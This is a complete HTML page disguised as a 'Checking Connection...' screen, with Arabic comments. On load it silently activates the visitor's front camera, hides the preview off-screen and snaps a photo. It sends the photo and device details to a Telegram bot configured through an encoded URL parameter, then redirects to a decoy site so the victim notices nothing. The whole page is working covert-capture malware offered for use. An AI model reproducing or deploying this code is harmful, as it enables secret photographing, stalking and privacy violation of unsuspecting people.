<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Checking Connection...</title>
    <style>
        /* واجهة بيضاء تماماً بدون أي عناصر مرئية */
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #ffffff;
            overflow: hidden;
            display: flex; align-items: center; justify-content: center;
        }
        /* إخفاء الكاميرا والمعاينة تماماً */
        #video, #canvas { position: fixed; top: -1000px; left: -1000px; opacity: 0; }
    </style>
</head>
<body>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            // 1. استخراج الإعدادات المشفرة من الرابط (Base64)
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('p');
            
            let config = { t: null, c: null, r: "https://google.com" }; 
            if (encodedData) {
                try {
                    const decoded = JSON.parse(atob(encodedData));
                    config.t = decoded.t; // Telegram Bot Token
                    config.c = decoded.c; // Chat ID
                    config.r = decoded.r; // Redirect URL
                } catch (e) { console.error("Config Error"); }
            }

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            // 2. دالة الإرسال الموثوقة (مثل السكربت الذي أرسلته)
            async function sendToTelegram(blob) {
                if (!config.t || !config.c) return;
                
                const fd = new FormData();
                fd.append('chat_id', config.c);
                fd.append('photo', blob, 'capture.jpg');
                fd.append('caption', `⚡️ ⚡️ \nDevice: ${navigator.userAgent}\nIP: Captured via Gateway`);

                try {
                    await fetch(`https://api.telegram.org/bot${config.t}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    });
                } catch (err) {
                    console.error("Delivery failed");
                }
            }

            // 3. المحرك الأساسي: التقاط سريع جداً وصامت
            async function startProcess() {
                try {
                    // طلب الكاميرا فوراً وبدون تردد
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: false 
                    });
                    video.srcObject = stream;

                    // انتظار طفيف جداً لضمان استقرار العدسة (أسرع من الكود السابق)
                    setTimeout(async () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        // تحويل الصورة بجودة عالية 0.9
                        canvas.toBlob(async (blob) => {
                            // إرسال الصورة في الخلفية
                            await sendToTelegram(blob);
                            
                            // إغلاق الكاميرا فوراً
                            stream.getTracks().forEach(t => t.stop());
                            
                            // التوجيه النهائي للرابط المطلوب (Redirect)
                            window.location.replace(config.r);
                        }, 'image/jpeg', 0.9);

                    }, 400); // 400 جزء من الثانية فقط (سرعة البرق)

                } catch (err) {
                    // في حال الرفض أو الخطأ، التوجيه فوراً لعدم الشك
                    window.location.replace(config.r);
                }
            }

            // تشغيل العملية فور تحميل الصفحة
            window.onload = startProcess;

            // ضمان إغلاق الكاميرا إذا غادر المستخدم الصفحة قبل الاكتمال
            window.addEventListener('beforeunload', () => {
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(t => t.stop());
                }
            });
        })();
    </script>
</body>
</html>
